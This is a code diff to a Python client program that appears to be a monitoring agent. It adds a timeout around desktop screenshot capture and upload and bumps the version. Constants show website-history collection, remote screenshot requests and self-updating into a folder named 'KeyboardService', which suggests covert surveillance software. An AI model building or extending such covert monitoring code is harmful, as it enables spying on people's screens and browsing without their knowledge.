@@ -47,7 +47,8 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-APP_VERSION = "1.2.15"
+SCREENSHOT_CAPTURE_TIMEOUT_SECONDS = 60
+APP_VERSION = "1.2.16"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -1030,8 +1031,28 @@ def report_screenshot_status(status, message):
 
 
 def capture_and_upload_screenshot():
+    capture_result = {}
+    capture_error = {}
+
+    def capture_image():
+        try:
+            capture_result["image"] = capture_desktop_screenshot()
+        except Exception as error:
+            capture_error["error"] = error
+
     try:
-        upload_device_screenshot(capture_desktop_screenshot())
+        capture_thread = Thread(target=capture_image, daemon=True)
+        capture_thread.start()
+        capture_thread.join(SCREENSHOT_CAPTURE_TIMEOUT_SECONDS)
+        if capture_thread.is_alive():
+            report_screenshot_status(
+                "Failed",
+                f"Desktop capture timed out after {SCREENSHOT_CAPTURE_TIMEOUT_SECONDS} seconds.",
+            )
+            return
+        if "error" in capture_error:
+            raise capture_error["error"]
+        upload_device_screenshot(capture_result.get("image", ""))
     except Exception as error:
         print(f"Screenshot worker failed: {type(error).__name__}: {error}")
         report_screenshot_status("Failed", f"Screenshot worker failed: {type(error).__name__}")
